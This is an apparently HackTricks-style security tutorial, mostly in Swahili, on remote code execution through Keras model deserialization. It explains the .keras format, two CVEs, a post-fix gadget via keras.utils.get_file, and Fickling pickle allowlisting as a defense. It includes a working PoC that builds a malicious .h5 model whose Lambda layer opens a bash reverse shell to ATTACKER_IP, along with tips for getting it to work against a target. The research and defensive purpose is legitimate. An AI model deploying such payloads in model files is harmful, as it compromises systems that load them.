# Keras Model Deserialization RCE na Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa mbinu za vitendo za exploitation dhidi ya pipeline ya Keras model deserialization, unaeleza internals na attack surface ya native .keras format, na kutoa toolkit kwa watafiti ya kutafuta Model File Vulnerabilities (MFVs) na gadgets baada ya fix.

## Internals za .keras model format

Faili la .keras ni ZIP archive linalojumuisha angalau:<sup>[[1]](#references)</sup>
- metadata.json – taarifa za jumla (kwa mfano, Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – weights katika HDF5

config.json huendesha recursive deserialization: Keras hu-import modules, hutatua classes/functions, na huunda upya layers/objects kutoka kwa dictionaries zinazodhibitiwa na attacker.<sup>[[1]](#references)</sup>

Mfano wa snippet ya Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization hufanya:<sup>[[1]](#references)</sup>
- Uingizaji wa Module na utatuzi wa symbol kutoka kwenye keys za module/class_name
- Utekelezaji wa from_config(...) au constructor kwa kutumia kwargs zinazodhibitiwa na mshambuliaji
- Ujirudiaji kwenye objects zilizowekwa ndani (activations, initializers, constraints, n.k.)

Kihistoria, hii ilimpa mshambuliaji primitives tatu wakati wa kuunda config.json:<sup>[[1]](#references)</sup>
- Udhibiti wa modules zinazoingizwa
- Udhibiti wa classes/functions zinazotatuliwa
- Udhibiti wa kwargs zinazopitishwa kwa constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Chanzo kikuu:
- Lambda.from_config() ilitumia python_utils.func_load(...) ambayo hufanya base64-decodes na kuita marshal.loads() kwenye bytes za mshambuliaji; Python unmarshalling inaweza kutekeleza code.<sup>[[1]](#references)[[3]](#references)</sup>

Wazo la exploit (payload iliyorahisishwa katika config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.<sup>[[1]](#references)</sup>

Notes:
- Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn used unrestricted importlib.import_module() with attacker-controlled module strings from config.json.
- Impact: Arbitrary import of any installed module (or attacker-planted module on sys.path). Import-time code runs, then object construction occurs with attacker kwargs.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Maboresho ya usalama (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports zimezuiwa kwa modules rasmi za ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Safe mode kwa chaguo-msingi: safe_mode=True huzuia upakiaji wa unsafe Lambda serialized-function
- Ukaguzi wa msingi wa aina: objects zilizodeserialize lazima zilingane na types zinazotarajiwa

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Production stacks nyingi bado zinakubali legacy TensorFlow-Keras HDF5 model files (.h5). Ikiwa attacker anaweza kupakia model ambayo server baadaye inaload au kuendesha inference, Lambda layer inaweza kutekeleza Python kiholela wakati wa load/build/predict.<sup>[[7]](#references)</sup>

Minimal PoC ya kutengeneza malicious .h5 inayotekeleza reverse shell inapodeserialize au kutumiwa:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Vidokezo kuhusu reliability:
- Pointi za kuchochea: code inaweza kuendeshwa mara nyingi (kwa mfano, wakati wa layer build/first call, model.load_model, na predict/fit). Fanya payloads ziwe idempotent.<sup>[[7]](#references)</sup>
- Kufunga matoleo: linganisha TF/Keras/Python ya victim ili kuepuka kutolingana kwa serialization. Kwa mfano, tengeneza artifacts chini ya Python 3.8 yenye TensorFlow 2.13.1 ikiwa hiyo ndiyo inayotumiwa na target.<sup>[[7]](#references)</sup>
- Uigaji wa haraka wa environment:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Uthibitishaji: payload isiyo na madhara kama os.system("ping -c 1 YOUR_IP") husaidia kuthibitisha execution (kwa mfano, kuchunguza ICMP kwa tcpdump) kabla ya kubadilisha kwenda reverse shell.<sup>[[7]](#references)</sup>

## Uso wa gadget baada ya marekebisho ndani ya allowlist

Hata kwa allowlisting na safe mode, surface pana bado inabaki miongoni mwa Keras callables zinazoruhusiwa. Kwa mfano, keras.utils.get_file inaweza kudownload URLs za kiholela kwenye locations zinazochaguliwa na mtumiaji.<sup>[[1]](#references)</sup>

Gadget kupitia Lambda inayorejelea function iliyoruhusiwa (si Python bytecode iliyoserialishwa):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Kikomo muhimu:
- Lambda.call() huweka input tensor kama argument ya kwanza ya positional wakati wa kuita target callable. Gadgets zilizochaguliwa lazima zivumilie positional arg ya ziada (au zikubali *args/**kwargs). Hili linaweka mipaka kwa functions zinazoweza kutumika.<sup>[[1]](#references)</sup>

## ML pickle import allowlisting for AI/ML models (Fickling)

Miundo mingi ya AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, TensorFlow artifacts za zamani, n.k.) hujumuisha data ya Python pickle. Attackers hutumia mara kwa mara pickle GLOBAL imports na object constructors kufanikisha RCE au kubadilisha model wakati wa load. Scanners zinazotegemea blacklist mara nyingi hukosa imports hatari mpya au ambazo hazijaorodheshwa.<sup>[[8]](#references)[[14]](#references)</sup>

Defense ya kivitendo ya fail-closed ni ku-hook pickle deserializer ya Python na kuruhusu tu set iliyopitiwa ya imports zisizo na madhara zinazohusiana na ML wakati wa unpickling. Fickling ya Trail of Bits hutekeleza policy hii na inakuja na curated ML import allowlist iliyoundwa kutoka kwa maelfu ya public Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>

Security model ya imports “salama” (maelezo yaliyofupishwa kutoka kwa utafiti na mazoezi): symbols zilizoimportiwa na kutumiwa na pickle lazima kwa pamoja:<sup>[[8]](#references)</sup>
- Zisitekeleze code au kusababisha execution (bila compiled/source code objects, shelling out, hooks, n.k.)
- Zisipate au kuweka arbitrary attributes au items
- Zisiimport au kupata references za Python objects nyingine kutoka kwa pickle VM
- Zisisababishe secondary deserializers (k.m. marshal, nested pickle), hata kwa njia isiyo ya moja kwa moja

Washa protections za Fickling mapema iwezekanavyo wakati wa kuanzisha process, ili pickle loads zozote zinazofanywa na frameworks (torch.load, joblib.load, n.k.) zikaguliwe:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Vidokezo vya uendeshaji:
- Unaweza kuzima/kuwezesha tena hooks kwa muda pale inapohitajika:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ikiwa model inayojulikana kuwa salama imezuiwa, panua allowlist ya mazingira yako baada ya kukagua symbols:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling pia hutoa runtime guards za jumla ikiwa unapendelea udhibiti wa kina zaidi:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` ili kutekeleza ukaguzi kwa `pickle.load()` zote
- `with fickling.check_safety():` kwa utekelezaji wa scope maalum
- `fickling.load(path)` / `fickling.is_likely_safe(path)` kwa ukaguzi wa mara moja

- Pendelea model formats zisizo za pickle inapowezekana (kwa mfano, SafeTensors).<sup>[[15]](#references)</sup> Ikiwa ni lazima ukubali pickle, endesha loaders kwa least privilege bila network egress na utekeleze allowlist.

Mkakati huu wa allowlist-first unaonyesha wazi kuwa huzuia njia za kawaida za ML pickle exploit, huku ukidumisha compatibility ya juu. Katika benchmark ya ToB, Fickling ilitambua 100% ya files bandia hasidi na ikaruhusu takriban 99% ya files safi kutoka kwenye repos kuu za Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit ya mtafiti

1) Ugunduzi wa gadget kwa utaratibu katika modules zinazoruhusiwa

Orodhesha callables zinazowezekana katika keras, keras_nlp, keras_cv, keras_hub na upe kipaumbele kwa zile zenye side effects za file/network/process/env.<sup>[[1]](#references)</sup>

<details>
<summary>Orodhesha callables zinazoweza kuwa hatari katika Keras modules zilizo kwenye allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Upimaji wa direct deserialization (hakuna .keras archive inayohitajika)

Wasilisha dicts zilizotengenezwa kwa makusudi moja kwa moja kwenye Keras deserializers ili kujifunza params zinazokubaliwa na kuchunguza athari za pembeni.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Uchunguzi wa matoleo tofauti na formats

Keras inapatikana katika codebases/eras nyingi zenye guardrails na formats tofauti:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, imepangwa kuondolewa)
- tf-keras: inadumishwa kando
- Multi-backend Keras 3 (official): ilianzisha native .keras

Rudia tests katika codebases na formats tofauti (.keras dhidi ya legacy HDF5) ili kugundua regressions au guards zinazokosekana.

## References

- [1] [Kuwinda Vulnerabilities katika Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Iliongeza ukaguzi kwenye serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Kulinda AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Usuli wa mashambulizi ya Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Mradi wa SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
